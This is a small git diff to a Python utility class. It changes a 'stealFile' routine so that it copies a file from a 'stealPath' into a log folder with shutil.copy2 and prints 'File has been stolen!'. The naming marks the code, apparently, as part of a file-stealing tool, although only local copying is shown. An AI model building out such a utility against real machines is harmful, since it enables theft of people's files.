@@ -1,6 +1,6 @@
 from subprocess import check_output
 from json import loads
-from shutil import copy
+from shutil import copy, copy2
 
 
 class Util:
@@ -12,6 +12,7 @@ class Util:
                 FILE.write(str(data))
         except Exception:
             print('fileOut Error!')
+
 
 
     @staticmethod
@@ -49,7 +50,7 @@ class Util:
         if stealPath:
             try:
                 filename = stealPath.split('\\')[-1]
-                copy(stealPath, logPath + filename)
+                copy2(stealPath, logPath + filename)
                 print('File has been stolen!')
             except Exception:
                 print('stealFile error!!!')
